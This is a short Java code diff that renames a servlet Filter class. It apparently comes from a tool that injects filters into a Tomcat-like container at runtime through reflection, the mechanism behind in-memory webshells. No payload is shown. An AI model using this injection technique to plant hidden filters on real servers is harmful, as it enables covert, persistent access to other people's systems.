@@ -21,7 +21,7 @@ import java.util.Set;
  *
  * @author QI4L
  */
-public class TSMSFromJMXF implements Filter {
+public class TFMSFromJMX implements Filter {
     public static String pattern;
 
     public static String NAME;
@@ -68,7 +68,7 @@ public class TSMSFromJMXF implements Filter {
 
                     Object filterDef = filterDefClass.newInstance();
                     filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, NAME);
-                    Filter filter = new TSMSFromJMXF();
+                    Filter filter = new TFMSFromJMX();
 
                     filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, filter.getClass().getName());
                     filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, filter);
